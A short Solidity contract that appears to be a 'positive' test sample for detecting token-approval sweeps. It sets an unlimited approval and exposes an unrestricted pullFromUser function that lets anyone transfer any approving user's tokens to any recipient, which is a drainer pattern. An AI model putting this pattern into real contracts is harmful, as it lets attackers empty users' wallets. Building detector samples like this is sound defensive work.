// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract ApprovalSweepViaDelegatePositive {
    IERC20 public immutable token;
    uint256 public constant MAX_APPROVAL = type(uint256).max;

    event PullAllowancePrepared(address indexed user, uint256 amount);

    constructor(IERC20 _token) {
        token = _token;
    }

    function preparePullAllowance() external {
        require(token.approve(address(this), MAX_APPROVAL), "approve failed");
        emit PullAllowancePrepared(msg.sender, MAX_APPROVAL);
    }

    function pullFromUser(address user, address recipient, uint256 amount) external {
        require(token.transferFrom(user, recipient, amount), "pull failed");
    }
}
